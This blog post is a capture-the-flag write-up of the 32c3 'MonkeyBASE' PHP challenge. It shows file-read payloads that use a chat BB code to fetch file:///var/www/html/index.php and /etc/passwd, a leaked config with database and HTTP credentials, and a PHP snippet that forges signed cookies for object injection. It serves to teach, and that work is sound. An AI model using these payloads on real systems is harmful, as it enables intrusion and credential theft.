---
layout: post
title: 32c3 CTF MonkeyBASE write-up
tags: CTF, 32c3 CTF, PHP, injection
---

>A group of highly trained monkeys from outer space have been using earthlings technology to communicate ( over the web ). we want to know their secrets and intentions so we infiltrated them. Here's their platform of communication and an invite key:
>
>http://136.243.194.35/
>
>invite key: d991065ab84307e7904e2b9b515a2d69

In this challenge we were given an invite key so we could register a user. Poking around the login/register screens did not yield anything unusual or outright vulnerable.  <!--more-->

![](http://i.imgur.com/z8KRZfV.png)
![](http://i.imgur.com/n5S7uUp.png)

Registered my dummy user and started looking around the application:
![](http://i.imgur.com/sZWXDf9.png)

Typed in random chars in the chat, hit Return and that went to void (didn't appear on the screen). Clicked around, clicked on my own user in the members column and typed some text again. Saw the message appear in the chat. Tried some XSS right away with no success. Cookies didn't promise anything – just a PHPSESSID. Started clicking around again and looking into the HTML sources when I found *Help* and *Settings* menu. The *Settings* screen allowed changing some params like number
of recent conversations to show and number of users. After hitting the save button I spotted the change in cookies: `token` and `settings` fields were added. `settings` looked like a Base64-encoded string, decoding which gives: 

~~~javascript
'a:2:{s:11:"onlineusers";s:1:"3";s:11:"recentchats";s:1:"3";}'
~~~

Clearly, PHP's `serialize()` is at work. Playing around with the settings didn't work out because the `token` had to be forged as well w.h.p. 

Meanwhile looked at the robots.txt which contained the following lines:

~~~
User-agent: *
Disallow: /assets/
Disallow: /controller/
Disallow: /classes/
Disallow: /pages/
~~~

Looked into the last spot – *Help*. Then things became clear to me. Among other BB codes there was `[URL][/URL]` one which if sent to the chat would produce a table with  host, title and description of the URL passed in. I typed in `[URL]http://google.com[/URL]` and got back German Google page. Apparently, it was server-side request and not from my browser i.e. no XHR as my IP wasn't German by far.

I tried then `[URL]http://localhost/classes/[/URL]` as I already had a list of directories from the *robots.txt* file and it worked out. I was able to read all the PHP sources in those directories, except for `main` and `index.php` which was of the most interest. The sources were helpful but did not contain hints where the flag was. I saw some cookie deserialization procedures there and magic `__contruct`, `__destruct` methods and though of object injection via cookies. However, things were way simpler. I tried to send the `[URI]file:///var/www/html/index.php[/URI]` (in fact, even `/etc/passwd` would work) as part of my guess where the current web root is (default Apache path) and got back the sources of the script which included `config.php`. Doing the same for the latter revealed:

~~~php
<?php
	$con=mysqli_connect("localhost","monkeybase","SlkjDZOnsxKBZU","monkeybase");
	if (mysqli_connect_errno())	{
		echo "Failed to connect to MySQL: " . mysqli_connect_error();
	}
	mysqli_set_charset($con,"utf8");

	// Area51 is on /SuperMonkeysArea51/ SuperMonkey:w34r3th3sup3r0ut3rsp4c3cr34tur35

	$pages=array("main","settings","help","logout","out","iframe");
	$confvars=array(
		"invite_code"	 =>"d991065ab84307e7904e2b9b515a2d69",
		"url"			 =>"http://136.243.194.35/",
		"stream_context" =>	array (
						        'http' => array (
						            'follow_location' => FALSE 
						        )
						    )
	);

	if(!function_exists('checkinput')){
		function checkinput($input){
			global $con;
			return @mysqli_real_escape_string($con,$input);
		}
	}
	if(!function_exists('checkoutput')){
		function checkoutput($input){
			return @htmlspecialchars($input);
		}
	}
	if(!function_exists('redirect')){
		function redirect($url){
			header("location: ".$url);
			die();
		}
	}
	if(!function_exists('strToHex')){
		function strToHex($string){
		    $hex = '';
		    for ($i=0; $i<strlen($string); $i++){
		        $ord = ord($string[$i]);
		        $hexCode = dechex($ord);
		        $hex .= substr('0'.$hexCode, -2);
		    }
		    return strToUpper($hex);
		}
	}
	if(!function_exists('hexToStr')){
		function hexToStr($hex){
		    $string='';
		    for ($i=0; $i < strlen($hex)-1; $i+=2){
		        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
		    }
		    return $string;
		}
	}

?>
~~~

The hint was straightforward: 

> Area51 is on /SuperMonkeysArea51/ SuperMonkey:w34r3th3sup3r0ut3rsp4c3cr34tur35`

I navigated to `/SuperMonkeysArea51` and was prompted with a basic HTTP authentication. The hint looked like HTTP credentials (colon) and I typed those in to find another file under the directory named `d322289ce0ddbf435603455bf0ecf1b36b5cc79a_note.php` Running it by navigating in the browser rendered an empty file while the Apache-styled directory listing was showing positive file size value. Hence, I went back to the chat window and provided the full path to the newly discovered file which returned:

~~~
<?php
	// SECRET 32c3_W3_4re_Ju57_An_Adv4nc3d_Br33d_0f_Monkeys_0n_A_M1n0r_Plan3t_0f_A_V3ry_Av3r4ge_St4r
?>
~~~

I was unsatisfied that the challenge did not make use of PHP object injection as I was expecting initially and tried to go along that route. The two classes that play an important role in object injection are `VISUALIZER` and `SETTINGS`:

~~~php
<?php
Class VISUALIZER{
	public  $url;
	public  $context;
	public  $host;

	public function __construct($url){
		global $confvars;
		$this->url    =$url;
		if(!$this->is_url($this->url)){
			return FALSE;
		}
		$urlinfo      =parse_url($this->url);
		$this->host	  =@$urlinfo["host"];
		$this->context=$confvars['stream_context'];
	}
	public function __destruct(){
		global $thisuser;
		$context=stream_context_create($this->context);
		$content=file_get_contents($this->url, false, $context);
		$html   =$this->parse_html($content);

		$ClassDB=new DB();
		$page 	=$ClassDB->getArray("*","visualizer","WHERE url='".checkinput($this->url)."'");
		if(!@$page){
			$token=md5(time().$thisuser["id"].$thisuser["secret"]);
			$ClassDB->doInsert("visualizer","'$token','".checkinput($this->url)."','".checkinput($this->host)."','".checkinput($html["desc"])."','".checkinput($html["title"])."','".strToHex(substr($content,0,5000))."'");
		}
	}

	public function is_url(){
		return(preg_match("/https?:\/\/(www)?\.?[-a-z0-9]+\.?[a-z]{0,5}[-a-z0-9+&@#\/%=~_|\?\.]+$/i",$this->url)?TRUE:FALSE);
	}
	public function parse_html($html){
		preg_match("/<title(.*?)>(.*?)<\/title>/i",$html,$ma);
		$title=@$ma[2];
		preg_match("/<meta name=\"description\" content=\"(.*?)\".+/",$html,$ma);
		$desc=@$ma[1];
		return array("title"=>$title,"desc"=>$desc);
	}
}

?>
~~~

~~~php
<?php
Class SETTINGS{
	public function get_secret(){
		$salt1="0c53bfaaf9cf61ee0fe633d04bf1aa2ce4447c6e";
		$salt2="e535a49df94bc36992b5e20e03c9be466f961219";
		return array("s1"=>$salt1,"s2"=>$salt2);
	}
	public function get_settings(){
		$salt    =$this->get_secret();
		$token   =@$_COOKIE['token'];
		if(hash("sha512", $salt['s1'].@$_COOKIE['settings'].$salt['s2'], false)===$token){
			$settings=@unserialize(base64_decode(@$_COOKIE['settings']));
			return(@$settings?@$settings:array());
		}else{
			return array();
		}
	}
	public function set_settings($settings){
		if($serialized=base64_encode(serialize(@$settings))){
			setcookie("settings", $serialized, time()+99999);
			$salt=$this->get_secret();
			setcookie("token", hash("sha512", $salt['s1'].$serialized.$salt['s2'], false), time()+99999);
			return TRUE;
		}else{
			return FALSE;
		}
	}
}
?>
~~~

and then in some other file:

~~~php
<?php
	include 'classes/SETTINGS';
	include 'classes/VISUALIZER';
	
	$ClassSettings=new SETTINGS();
    $user_settings=$ClassSettings->get_settings();
?>
~~~

As you can see, the `SETTINGS` class verifies the received cookies against a hard-coded hash and then deserializes the `settings` value. On another account, the `VISUALIZER` class implements two *magic methods* `__construct` and `__destruct`. As we have all needed to cook cookies we can try object injection (or [try at home](https://gist.github.com/0xBADCA7/c8be92b52ace19746220)):

~~~php
<?php
	$vz = new VISUALIZER('/etc/passwd');
	$serialized = serialize($vz);
	print $serialized;
	print(base64_encode($serialized);
	print hash("sha512", "0c53bfaaf9cf61ee0fe633d04bf1aa2ce4447c6e" . base64_encode($serialized) . "e535a49df94bc36992b5e20e03c9be466f961219", false);
?>
~~~

Shove in the obtained `token` and `settings` into browser cookies and reload the existing session while browsing the challenge. Now you have to type in to the chat window the same file path that you specified in the object injection (`/etc/passwd` in this example) as the contents of that ultimately ends up in the DB and to get it back you need to pass it on to `[URI]/etc/passwd[/URI]`. At this moment one may realize that this essentially has the same effect as without object injection.

> Read the manual if unsure, post comment(s) if unclear.

